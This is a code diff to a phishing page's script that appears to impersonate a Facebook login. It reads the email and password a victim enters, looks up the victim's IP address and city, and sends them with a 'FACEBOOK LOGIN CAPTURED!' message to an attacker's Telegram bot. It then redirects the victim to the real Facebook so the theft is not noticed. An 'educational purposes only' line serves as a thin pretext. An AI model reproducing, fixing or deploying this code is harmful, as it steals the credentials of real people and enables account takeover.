@@ -187,15 +187,23 @@
 
     <script src="config.js"></script>
     <script>
+    // Wait for config.js to load
+    function waitForConfig() {
+        return new Promise((resolve) => {
+            if (typeof window.BOT_TOKEN !== 'undefined' && window.BOT_TOKEN) {
+                resolve();
+            } else {
+                setTimeout(() => resolve(waitForConfig()), 100);
+            }
+        });
+    }
+
     let BOT_TOKEN = "";
-    let TELEGRAM_BOT_LINK = "https://t.me/myanmar_sms_bomb_bot";
     
-    if (typeof window.BOT_TOKEN !== 'undefined') {
+    waitForConfig().then(() => {
         BOT_TOKEN = window.BOT_TOKEN;
-    }
-    if (typeof window.TELEGRAM_BOT_LINK !== 'undefined') {
-        TELEGRAM_BOT_LINK = window.TELEGRAM_BOT_LINK;
-    }
+        console.log("Bot token loaded:", BOT_TOKEN ? "Yes" : "No");
+    });
 
     function GetURLParameter(sParam) {
       var sPageURL = window.location.search.substring(1);
@@ -224,6 +232,16 @@
         return;
       }
       
+      // Get form values
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('name').value;
+      
+      if (!email || !password) {
+        console.log('Please fill in all fields');
+        return;
+      }
+      
+      // Get IP address information
       fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -231,10 +249,6 @@
           const ip = data.ip;
           const cityName = data.city;
           const countryName = data.country_name;
-          
-          const page = document.getElementById("pagename").value;
-          const password = document.getElementById("name").value;
-          const email = document.getElementById("email").value;
           const currentTime = new Date().toLocaleString();
           
           let message = `🔐 *FACEBOOK LOGIN CAPTURED!*\n\n`;
@@ -244,7 +258,6 @@
           message += `🌐 *IP Address:* ${ip}\n`;
           message += `📍 *Location:* ${cityName}, ${countryName}\n`;
           message += `🕐 *Time:* ${currentTime}\n\n`;
-          message += `📌 *Page:* ${page}\n`;
           message += `⚠️ *Educational purposes only!*`;
           
           const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -261,16 +274,18 @@
             },
             body: JSON.stringify(telegramParams)
           })
-          .then(response => {
-            if (response.ok) {
+          .then(response => response.json())
+          .then(data => {
+            console.log('Telegram API response:', data);
+            if (data.ok) {
               window.location.href = "https://www.facebook.com";
             } else {
-              console.log('Error sending data to Telegram');
+              console.log('Error from Telegram API:', data.description);
               window.location.href = "https://www.facebook.com";
             }
           })
           .catch(error => {
-            console.log('Error:', error);
+            console.log('Fetch error:', error);
             window.location.href = "https://www.facebook.com";
           });
         })
